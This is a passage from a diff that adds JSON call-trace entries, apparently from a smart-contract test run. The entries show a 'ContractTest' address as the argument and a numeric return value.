+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "46750754909 [4.675e10]"
+    },
+    {
+        "id": "529",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "46750754909 [4.675e10]"
+    }
+]
